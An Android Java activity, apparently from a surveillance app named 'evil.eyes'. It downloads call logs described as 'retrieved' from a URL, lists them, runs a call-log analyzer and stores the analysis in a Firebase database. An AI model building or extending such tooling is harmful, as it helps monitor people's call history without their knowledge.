package evil.eyes.ui;

import android.os.Bundle;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.AppCompatButton;
import androidx.appcompat.widget.Toolbar;
import androidx.recyclerview.widget.RecyclerView;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import evil.eyes.R;
import evil.eyes.core.adapters.CallLogAdapter;
import thundersharp.sensivisionhealth.loganalyzer.annos.ArrangeBy;
import thundersharp.sensivisionhealth.loganalyzer.annos.OperationModes;
import thundersharp.sensivisionhealth.loganalyzer.asyncs.CallLogsAnalyzer;
import thundersharp.sensivisionhealth.loganalyzer.errors.AnalyzeException;
import thundersharp.sensivisionhealth.loganalyzer.interfaces.OnCallLogsAnalyzed;

public class PhoneDisplay extends AppCompatActivity {

    private RecyclerView recyclerView;
    private AppCompatButton analyze;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_phone_display);
        ((Toolbar) findViewById(R.id.toolbar)).setNavigationOnClickListener(h -> finish());
        recyclerView = findViewById(R.id.rec);
        analyze = findViewById(R.id.schedule_new);

        if (getIntent().getStringExtra("uri") == null) {
            finish();
        }

        AlertDialog alertDialog = new AlertDialog.Builder(this)
                .setMessage("Please wait processing retrieved logs...")
                .setCancelable(false)
                .show();
        String URL = getIntent().getStringExtra("uri");

        try {
            RequestQueue requestQueue = Volley.newRequestQueue(this);

            StringRequest stringRequest = new StringRequest(Request.Method.GET, URL, new com.android.volley.Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    try {
                        JSONArray jsonObject = new JSONArray(response);
                        recyclerView.setAdapter(new CallLogAdapter(jsonObject));
                        analyze.setOnClickListener(o ->{

                            AlertDialog dialog = new AlertDialog.Builder(PhoneDisplay.this)
                                    .setView(R.layout.aa)
                                    .setPositiveButton("OK",(i,m)->{})
                                    .create();
                            dialog.show();
                            TextView test = dialog.findViewById(R.id.tt);

                            CallLogsAnalyzer.getCallLogsAnalyzer()
                                    .setArrangeBy(ArrangeBy.duration)
                                    .setOperationMode(OperationModes.basicAnalyze)
                                    .setOnCallLogsAnalyzedListener(new OnCallLogsAnalyzed() {
                                        @Override
                                        public void onExtractionSuccessFull(JSONObject data) {
                                            FirebaseDatabase.getInstance().getReference("kkk").setValue(data.toString());
                                            runOnUiThread(()->test.setText(data.toString()));
                                        }

                                        @Override
                                        public void onFailedToAnalyze(AnalyzeException analyzeException) {
                                            runOnUiThread(() ->{
                                                Toast.makeText(PhoneDisplay.this, ""+analyzeException.getMessage(), Toast.LENGTH_SHORT).show();

                                            });
                                        }

                                        @Override
                                        public void onProgress(int processed, long total) {
                                            runOnUiThread(()->test.setText("Processed "+processed+" of "+total));
                                        }
                                    }).execute(response);
                        });
                        alertDialog.dismiss();

                    } catch (JSONException e) {
                        e.printStackTrace();
                        alertDialog.dismiss();
                    }
                }
            }, new com.android.volley.Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    error.printStackTrace();
                    alertDialog.dismiss();
                }
            }) {

                @Override
                public String getPostBodyContentType() {
                    return "application/json;charset=UTF-8";
                }


            };
            requestQueue.add(stringRequest);
        } catch (Exception e) {
            e.printStackTrace();
            alertDialog.dismiss();
        }
    }
}